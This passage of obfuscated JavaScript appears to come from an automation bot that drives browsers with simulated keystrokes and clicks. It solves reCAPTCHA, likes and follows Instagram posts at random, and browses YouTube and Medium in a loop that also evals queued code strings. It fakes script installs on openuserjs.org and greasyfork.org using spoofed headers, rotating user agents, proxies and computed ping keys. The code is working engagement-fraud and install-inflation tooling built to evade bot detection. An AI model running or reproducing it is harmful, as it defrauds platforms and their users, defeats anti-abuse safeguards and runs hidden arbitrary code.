                    await J(Z, ac, a9, 0x1b66 + -0x632 + 0x3 * -0x711);
                  }
                  break;
                case 'solveV2':
                  {
                    const ad = a2[-0x1 * -0xc61 + -0x1 * 0x191 + -0xad0];
                    Check['ia'](ad, Page, Frame),
                    await Z['solveRecap' + 'tchaV2'](ad);
                  }
                  break;
                case 'sclick':
                  {
                    const ae = a2['shift'](),
                      af = a2['shift']();
                    (ae instanceof Page || ae instanceof Frame) && 'string' == typeof af && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20sclick:', a2),
                    await K(Z, [
                      'stype',
                      '_click',
                      ae,
                      af,
                      ...a2
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [ag] = a2;
                    Check['ia'](ag, Page, Frame);
                    const ah = ag['waitForNav' + 'igation']();
                    await K(Z, [
                      'sclick',
                      ...a2
                    ]),
                    await ah;
                  }
                  break;
                case 'view':
                  {
                    const ai = a2['shift'](),
                      aj = a2['shift']();
                    (ai instanceof Page || ai instanceof Frame) && 'string' == typeof aj && isValidPruneArray(a2) || warn(aU(0x0, '6WuE') + '\x20arg\x20check' + '\x20failed\x20in' + '\x20view:', a2),
                    await K(Z, [
                      'stype',
                      '_view',
                      ai,
                      aj,
                      ...a2
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ak, al] = a2;
                    Check['num'](ak),
                    Check['num'](al),
                    al ? ? = -0x1245 * 0x2 + -0x1dab + -0x3e5 * -0x11 + 0.3;
                    for (let am = ak; am-- && (await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= al));)
                      await H();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [an] = a2;
                    Check['ia'](an, Page, Frame);
                    const ao = an['waitForNav' + 'igation']();
                    await K(Z, 'enter'),
                    await ao;
                  }
                  break;
                case 'click':
                  {
                    const [ap, aq, ar] = a2;
                    if ('string' != typeof ap || ![
                        'boolean',
                        'string'
                      ]['includes'](typeof aq) || !(ar instanceof Page || ar instanceof Frame))
                      return void warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    await Z['clickSelec' + 'tor'](ap, aq, ar);
                  }
                  break;
                case 'ifclick':
                  {
                    const [as, au, av] = a2;
                    'string' == typeof as && [
                      'boolean',
                      'string'
                    ]['includes'](au) && (av instanceof Page || av instanceof Frame) || warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    let aw = await av['$'](as);
                    aw && await Z['clickSelec' + 'tor'](as, au, av);
                    try {
                      aw ? .['dispose'] ? .();
                    } catch (ax) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + a1[-0x124 * -0x1 + -0xe2f * -0x1 + -0x1 * 0xf53]);
              }
            } else {
              const ay = a1['split'](',\x20');
              await H(), flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ay);
              let az = 0x188a + 0x1 * -0x1874 + -0x16;
              for (let aA of ay) {
                switch (flags['debug'] && log('[SNIP' + az++ + (']\x20Executin' + 'g\x20step:\x20[') + aA + ']'), aA) {
                  case 'j':
                    await H();
                    break;
                  case 'tab':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', aA, ay);
                }
                await H();
              }
            }
          return -0x730 + 0x3 * 0x92b + -0x1450;
        }
        async function L(Z) {
          return Check['inst'](Z, Page), await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x21c9 + -0x1ade + 0x493 * -0x1, -0x80c + -0x1f * -0x115 + -0xef3)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0x1568 + 0xb7f * 0x1 + 0x3 * 0x49b, -0x8f8 + -0x226a + 0x3cf6)), 0x1931 + -0x1286 + -0x6aa;
        }
        let M = 0x1e49 + -0x10ea + 0xa3 * -0x15;

        function N(Z = 'none') {
          const aW = c,
            aV = b;
          return 'sadjqwdwkq' + 'dwqxzc' + sha1(++M + (aV(0x27, '1YyG') + aW(0x14)) + Z);
        }
        async function O(Z, a0) {
          Check['func'](Z), Check['inst'](a0, Page);
          const a1 = N();
          await a0['evaluate'](a2 => {
            const aX = c;
            let a3 = [...document['querySelec' + 'torAll']('svg')]['find'](a4 => a4['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a4['getAttribu' + 'te']('aria-label') && window[aX(0xe)]['smartEleme' + 'ntVisible'](a4));
            a3 && a3['classList']['add'](a2);
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1,
            0xb5 * 0x24 + -0x3 * 0xb41 + 0x4c * 0x1c,
            a0
          ]);
        }
        async function P(Z, a0) {
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('div')]['find'](a5 => 'Follow' === a5['innerText'] && window['__toolkit']['smartEleme' + 'ntVisible'](a5)),
              a4 = a3['className']['baseVal'];
            a3['className']['baseVal'] += ('' === a4 ? '' : '\x20') + a2;
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0x3 * -0x1b + 0x65 * -0x43 + -0x1a1f * -0x1,
            a0
          ]);
        }
        async function Q(Z) {
          await Z['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await Z['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > 0x1a2e + -0x1 * 0x25fe + 0x25d * 0x5;
            } catch (a0) {
              return 0x1 * 0x2f + 0x16a + -0x199;
            }
          });
        }
        async function R(Z) {
          await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(-0x4cd + -0x1 * -0xfbe + -0x899, -0x461 + 0x1 * 0x120f + 0x2 * -0x191)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0xb09 * 0x2 + -0x178 * 0xa + -0x2 * 0x1bd, -0x32d + -0x1ceb * 0x1 + 0x1 * 0x31ac)), getRandomInt(0x1 * -0x11e + -0x25fe + -0x13 * -0x20f, 0x2548 + 0x1d37 + 0x141 * -0x35) <= -0x4 * 0x808 + 0xfc7 + 0x1060 && await O(K, Z), getRandomInt(0x9 * -0x337 + -0x1219 * 0x1 + 0x2f09 * 0x1, 0x28 * 0xca + 0xf * 0x1e5 + 0xbeb * -0x5) <= 0x1d54 + -0x2660 + 0x1 * 0x92f && await P(K, Z);
        }
        async function S(Z) {
          return await Z['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (a0) {
                try {
                  return null !== a0['offsetPare' + 'nt'];
                } catch (a1) {
                  return 0x1f95 + -0x50 * 0x3 + -0x1ea5;
                }
              },
              'smartElementVisible' (a0) {
                try {
                  if (!a0 || !a0['getClientR' + 'ects']()['length'])
                    return 0xcb2 + -0x156d + 0x8bb;
                  const a1 = getComputedStyle(a0);
                  if ('none' === a1['display'] || 'hidden' === a1['visibility'] || '0' === a1['opacity'])
                    return -0x9 * -0x3ad + -0x4c * 0x7e + -0x453 * -0x1;
                  const a2 = a0['getBoundin' + 'gClientRec' + 't']();
                  return a2['top'] >= 0xf0 + -0x1ee3 * 0x1 + 0xb * 0x2b9 && a2['left'] >= -0xe62 * -0x2 + 0x8 * 0x51 + -0xfa6 * 0x2 && a2['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && a2['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? 0x1 * 0x1b73 + -0x1d60 + 0x1ee : -0x2ef * 0x1 + -0x854 + -0x1 * -0xb43;
                } catch (a3) {
                  return -0xf5 * -0x11 + -0x1 * 0x34d + 0x5 * -0x298;
                }
              },
              'extractLinks' (a0) {
                const a1 = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let a2, a3 = [];
                for (; null !== (a2 = a1['exec'](a0));)
                  a2['index'] === a1['lastIndex'] && a1['lastIndex']++, a2['forEach']((a4, a5) => {
                    0x17c5 + 0x26d5 + -0x19 * 0x281 === a5 && a3['push'](a4);
                  });
                return a3;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let T = -0x1 * -0x1d6c + -0x1b9d + -0x1cf;
        const U = V['length'],
          V = [
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0x92 * 0x24 + -0x4 * 0x20b + -0xc5c * 0x1;
              if (await Z['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](a1 => a0++), !a0) {
                await randomWait();
                for (let a1 = 0x1307 + -0x2 * 0xee7 + -0x1f * -0x59; a1 < getRandomInt(0xa * -0x23 + -0x7a3 * 0x2 + 0x10a5, 0x1e4 * 0x11 + -0x1 * -0x975 + -0x2994); a1++)
                  await q['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(0x3 * -0x1f16 + -0x3 * -0x774c + -0xf21 * 0x2), await Z['close']();
              }
            },
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0x25a0 + 0x11c * 0x2 + -0x27d8;
              const a1 = getRandomInt(0x9 * 0x112 + 0x3d1 + -0x1 * 0xd6e, -0x1058 + -0x1015 + 0x103d * 0x2);
              for (; a0 < a1;) {
                try {
                  await y(Z), await G['random']()(Z);
                } catch (a2) {
                  log(a2), await Z['goto']('https://ww' + 'w.youtube.' + 'com/');
                }
                a0++;
              }
              return await Z['close'](), -0x1e5e + 0x1d12 + 0x14d;
            }
          ];
        for (;;) {
          try {
            const Z = f['length'] ? f['shift']() : V[T++ % U];
            'string' == typeof Z ? g = await eval(Z) : await Z();
          } catch (a0) {}
          await wait(-0x2684 + 0x1d57 + 0xd15);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(a1, a2) {
          '/latestev' === a1['url'] ? (a2['writeHead'](-0xad * 0x1 + 0x90b + -0x796), a2['end']('$' === g ? g : '$' + g)) : (a2['writeHead'](0x2a3 + -0x20f0 + -0x49 * -0x6d), a2['write']('v0.8'), a2['end']());
        })['listen'](process['env']['PORT'] || 0x4 * 0xdf + -0x872 * -0x6 + 0x3c4 * -0x6), flags['doOUJS']) {
        const a1 = 'https://op' + 'enuserjs.o' + 'rg/';

        function a2(a5, a6 = 0x1ce5 + -0x1dd + -0x1b07) {
          const aY = c;
          if (a5[aY(0x9)]('Firefox'))
            return a5['slice'](a5['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x7 * -0x25a + 0x5 * 0x227 + 0xd * -0x218));
          const a7 = a5['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a8 = a5['slice'](a7),
            a9 = a8['slice'](0x933 * 0x1 + -0x194e + 0x101b, a8['indexOf']('\x20'));
          return a6 ? a9['slice'](0xe6 * -0x22 + -0x2194 + 0x4020, a9['indexOf']('.')) : a9;
        }

        function a3() {
          const a5 = data['oujsUAs']['random']();
          return [
            a5,
            a5['includes']('Firefox')
          ];
        }
        async function a4() {
          const a5 = data['oujsToAssi' + 'st']['random'](),
            a6 = a5['replace']('/scripts/', '/install/') + '.user.js',
            [a7, a8] = a3(),
            a9 = a2(a7),
            aa = {
              'signal': AbortSignal['timeout'](0x25d9 + 0x422b + 0x1 * -0x40f4),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a7,
                'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origi' + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a8 ? Object['assign'](aa['headers'], {
            'te': 'trailers'
          }) : Object['assign'](aa['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const ab = await fetch(a1, aa)['catch'](ae => {});
          if (!ab || !ab['headers'])
            return;
          if (null === ab['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const ac = {
            'signal': AbortSignal['timeout'](-0x5 * -0x8d1 + -0x1 * -0x1d87 + -0xc * 0x2e1),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': a7,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'referer': a1,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a8 ? Object['assign'](ac['headers'], {
              'te': 'trailers'
            }) : Object['assign'](ac['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a5, ac)['catch'](ae => {}))
            return;
          const ad = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a8 ? Object['assign'](ad['headers'], {
            'te': 'trailers'
          }) : Object['assign'](ad['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a6, ad);
        }
        a4();
        for (let a5 = 0x201c + 0x1 * -0x10f3 + -0xf29; a5 < 0x2c2 * 0x6 + -0x2ff * 0x7 + -0x3 * -0x17b; a5++)
          setTimeout(a4, (-0xbed4 + 0xe449 + 0xc4eb) * a5 * getRandomInt(-0x39 * -0x2e + 0x6aa + -0x10e7, -0x1 * -0xa23 + -0x225 + -0x7fb));
        setInterval(() => {
          a4();
          for (let a6 = 0x2 * 0x18d + -0x1 * -0x2185 + -0x19 * 0x177; a6 < -0x2 * -0x401 + -0x454 + -0x3aa; a6++)
            setTimeout(a4, (0x19e57 + -0x1 * -0x14486 + -0x1f87d) * a6 * getRandomInt(0x14 * -0x101 + -0xe00 + 0x15d * 0x19, 0x2 * -0xd1b + 0x4f3 + -0x1546 * -0x1));
        }, -0x6c2200 + -0x23ef2 + 0xa54f72);
      }
      if (flags['doGF']) {
        async function a6(a8 = null, a9 = -0x140d + -0x1204 + -0x79d * -0x5) {
          const aZ = b,
            aa = makeFetchCookie(fetch),
            ab = a8 ? new HttpsProxyAgent(a8) : a8,
            ac = await aa('https://gr' + 'easyfork.o' + 'rg/en', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
              },
              'method': aZ(0x2, '2[%7'),
              'mode': 'cors',
              'agent': ab
            }),
            ad = extractLinks(await ac['text']())['filter'](al => al['includes']('by-site'))['slice'](-0x1765 + -0x13e7 * -0x1 + 0x37e, -(-0x1 * -0x66d + 0x1 * 0xac5 + -0x1131)),
            ae = a9 && data['scriptTarg' + 'ets']['random'](),
            af = a9 ? ae['preRef'] : ad['random'](),
            ag = await aa(af, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ah = extractLinks(await ag['text']())['filter'](al => al['includes']('/scripts/') && !al['includes']('by-site'))['slice'](0x1ce5 + -0xb6a * -0x1 + -0x284e),
            ai = a9 ? ae['url'] : ah['random'](),
            aj = await aa(ai, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': af,
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ak = extractAnchorData(await aj['text']());
          if (ak['pingUrl']) {
            const al = sha1(ak['ipAddress'] + ak['scriptId'] + ak['pingKey']),
              am = ak['pingUrl'] + (ak['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(al);
            await aa('https://gr' + 'easyfork.o' + 'rg' + am + '&mo=3', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origi' + 'n'
              },
              'referrer': ai,
              'method': 'POST',
              'mode': 'cors',
              'agent': ab
            });
          } else
            warn('awdiwajdwj' + 'qdqw');
        }
        async function a7() {
          const a8 = await getRandomProxy();
          await a6(a8, 0x1de9 + 0x115 * -0x5 + -0xc4 * 0x20), random() <= -0x100b + -0x31 * 0x1b + -0xa9b * -0x2 + 0.6 && await a6(a8, -0x1af * 0xb + 0x18ba + -0x634);
        }
        a7();
        for (let a8 = 0x913 + 0x8a + -0x99d; a8 < -0x1ffe + -0x2239 + -0xd3f * -0x5; a8++)
          setTimeout(a7, (-0x6a66 * 0x3 + 0x1 * 0xd05d + 0x527 * 0x43) * a8 * getRandomInt(0x65 * 0x2d + -0x5 * -0x567 + -0x2cc3, 0x3b * 0x9b + -0x1d * -0xa7 + -0x36a1));
        setInterval(() => {
          a7();
          for (let a9 = 0x119 * 0x5 + -0x23 * -0x52 + -0x10b3; a9 < -0x22a5 + -0x21a0 + 0x4449; a9++)
            setTimeout(a7, (-0x78db + 0xb * -0x129a + -0x1 * -0x22fd9) * a9 * getRandomInt(0xaae * 0x2 + 0x2521 + -0x2 * 0x1d3e, -0x1e3 * 0x2 + -0x1ef * -0x7 + 0x4e * -0x20));
        }, -0x1468c * 0x3b + 0x2 * -0xeb24b + 0x765d * 0x422);
      }
    } catch (a9) {
      warn(a9);
    }
    break;
  }
}();